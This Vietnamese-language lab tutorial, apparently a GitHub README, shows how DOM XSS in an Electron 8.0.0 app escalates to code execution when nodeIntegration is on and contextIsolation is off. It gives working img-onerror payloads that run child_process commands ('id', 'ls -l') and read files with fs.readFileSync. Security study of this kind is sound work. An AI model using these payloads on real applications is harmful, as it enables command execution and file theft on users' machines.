# RCE-to-XSS-Electron-8.0.0


Ứng dụng Electron 8.0.0 là một phiên bản cũ của Electron, được sử dụng để xây dựng các ứng dụng desktop chéo nền tảng (cross-platform) bằng công nghệ web như JavaScript, HTML và CSS. 

Mặc dù mang lại nhiều lợi ích bằng việc cho phép phát triển các ứng dụng desktop ngang hàng với web bằng JavaScript, HTML, và CSS, nhưng cũng tiềm ẩn rủi ro về bảo mật, cụ thể là lỗ hổng XSS đến RCE (Remote Code Execution).

Tổng quan : XSS to RCE

Setup 

  Sử dụng Electron 8.0.0 open source 
  
  URL Download : https://github.com/standardnotes/desktop/archive/v2.0.0.tar.gz
 
  Commands
```
wget https://github.com/standardnotes/desktop/archive/v2.0.0.tar.gz
tar xvfz v2.0.0.tar.gz
cd desktop-2.0.0/
npm audit
```
![1](https://github.com/Lilly-dox/Exploit-CVE-2023-22518/assets/130746941/47051781-9a54-4831-8142-e6b165d3b16c)

Chúng ta nhận được output :
```
npm ERR! code ENOLOCK
npm ERR! audit This command requires an existing lockfile.
npm ERR! audit Try creating one first with: npm i --package-lock-only
npm ERR! audit Original error: loadVirtual requires existing shrinkwrap file

npm ERR! A complete log of this run can be found in:
npm ERR!     /home/lilly-dox/.npm/_logs/2024-03-20T15_39_01_845Z-debug-0.log
```
Như lỗi trên hiển thị, chúng ta phải tạo tệp pack-lock.json, sử dụng lệnh được cung cấp trong báo lỗi để xử lý 
```
npm i --package-lock-only
```
sau đó chạy lại command :
```
npm audit
```
![2](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/cd2349ca-7629-42b6-bbe5-6d69c97d7425)

XSS to RCE
Download the first vulnerability file :
<file vulnerable1.zip>

File : 
vulnerable1/main.js
![3](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/4a7efd61-c551-4b04-9c42-72ebdbd4222f)

Như đã thấy :
1. `nodeIntegration` được bật (`nodeIntegration: true`)**:
    - nodeIntegration được bật, trang web có thể tự do sử dựng các module Node.js. Mặc dù việc kích hoạt tính năng này có thể thuận tiện cho các nhà phát triển nhưng nó làm tăng đáng kể rủi ro bảo mật. Nếu kẻ tấn công khai thác lỗ hổng XSS (Cross-Site Scripting) trong ứng dụng, chúng có thể sử dụng API Node.js để thực hiện các hành động độc hại trên hệ thống của người dùng, chẳng hạn như đọc/ghi tệp hoặc thực thi lệnh, dẫn đến Mã từ xa Lỗ hổng thực thi (RCE).
2. `contextIsolation` bị tắt (`contextIsolation: false`)**:
    - contextIsolation là  Là một tính năng bảo mật khác của Electron, phân cách môi trường giữa các mã nguồn được thực thi trong renderer. Nếu contextIsolation bị tắt, nó giúp mã độc có khả năng truy cập vào các APIs và mở đường cho RCE nếu người dùng bị tấn công XSS.

Chúng ta sẽ lợi dụng sự tự do truy cập các API Node.js

Nói qua 1 xíu về API Node.js
API Node.js là môi trường thực thi code Javascript phía server máy chủ . sử dụng V8 engine, engine Javascript cùng một loạy các API tích hợp để cung cấp CHỨC NĂNG TƯƠNG TÁC VỚI HỆ ĐIỀU HÀNH hơn là chỉ chạy trong môi trường trình duyệt thông thường nhưu javascript .

Module thường xuyên bị attacker lợi dụng , nhất là khi API Node.js được dùng trong một môi trường với ít các biện pháp bảo mật , như là Electron khi ‘nodeIntegration’ <nút tích hợp> được bật . Các module thường bị lợi dụng là:
1.	Child_process : module cho pháp thực thi lệnh hệ thống hoặc các chương trình khác . Đại loại là child_process sẽ được lợi dụng để chạy shell .
2.	fs ( File system ) : lợi dụng để chỉnh sửa xóa , thêm file tùm lum . Cài phần mêm độc hại như file upload 
3.	‘net’ và ‘dgram’ : chiếm quyền tương tác với giao thực mạng TCP , UDP -> mở kết nối mạng độc hại hoặc thực hiện Dos
4. **`vm`**: Đây là một module cho phép bạn thực thi JavaScript trong một context ảo. Nó có thể bị lợi dụng để chạy mã độc trong một môi trường tưởng chừng được cô lập.
    5. **`os` và `path`**: Mặc dù ít nguy hiểm hơn các module khác, nhưng khi được kết hợp với các module như `fs`, chúng có thể được sử dụng để xây dựng các đường dẫn đến các tệp tin quan trọng hoặc thu thập thông tin về hệ thống mục tiêu.
=> Sử dụng suyntax của API Node.js để khai thác

Chúng ta sẽ ứng dụng và giải thích luôn 1 payload điển hình : 
```
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
```
1.	<img src=x : đoạn script này bắt đầu định nghĩa HTML image element.
Gán cho src=x nghĩa là không phải đường dân ảnh source ảnh hợp lệ . Nên đương nhiên sẽ kích hoạt sang onerror <đây là cố tình không điền src hợp lệ để điều hướng thực thi qua onerror >
2.	onerror= : đây là thuộc tính xử lí được kích hoạt khi src không hợp lệ
3.	alert(require(‘child_process’).execSync(‘id’).toString()); : Code Javascript này được thực thi do sự kiện onerror . 
*  Phần require(‘child_process’).execSync(‘id’) là lệnh Node.js sử dụng module child_process để thực thi lệnh hệ thống (system command) ‘id’ , lệnh này sẽ output ID của nhóm và người dùng thực (real and effective user and group IDs)
*  Phương thức execSync có nghĩa là thực thi lệnh một cách đồng bộ
execSync (viết tắt của executes synchronnously : thực thi đồng bộ). Nghĩa là nó sẽ chặn việc thực thi tiếp theo cho đến khi lệnh hệ thống (system command) trả về kết quả . 
Lệnh ‘id’ trả về thông tin về người dùng hiện tại như là ID người dùng (uid), ID nhóm (gid) và bất kì thành viên nhóm nào .

* Phương thức .toString() : chuyển đổi đầu ra của lệnh từ bộ đệm thành biểu diễn chuỗi (from buffer to a string representation)

* alert() là phương thức javascript tiêu chuẩn để hiển thị hộp thoại cánh báo với nội dung được chỉ định

Ứng dụng vào thực hành với file vulnerable1 <để ở trên>

File chứa lỗ hổng được "trích xuất" ra từ Electron 8.0.0

File:
vulnerable1/renderer.js

 ![4](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/fe5546a0-8657-437a-b3b6-1167166ac820)


 Nhận diện có innerHTML sink -> DOM XSS in innerHTML sink 

Khai thác :
 Dựng vulnerable1 lên để khai thác
 Commands:
 ```
 cd /path/to/vulnerable1
 npm install
 npm start
```
![5](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/0fde2e41-b063-472b-a976-925dadbc6806)

Sau khi start :

![6](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/4041753a-dbf7-4d33-b79c-6fdf1b70ca78)

Payloads :
```
test <img src=x onerror=alert("XSS")>
```
![7](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/57a12b6f-4691-46f8-8841-f3f067992d80)

```
<img src=x onerror="alert(require('child_process').execSync('id').toString());"> 
```
![8](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/901d21ef-5400-4c16-955f-d063213abd26)

```
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
```
![9](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/e0859aa1-ac5e-4189-ad9f-77f706a640d1)

Đọc được cả file nếu muốn 
```
<img src=x onerror=”alert(require(‘fs’).readFileSync(‘main.js’).toString());”>
```

![image](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/05068ccd-5568-47be-a810-0d6dd6028399)
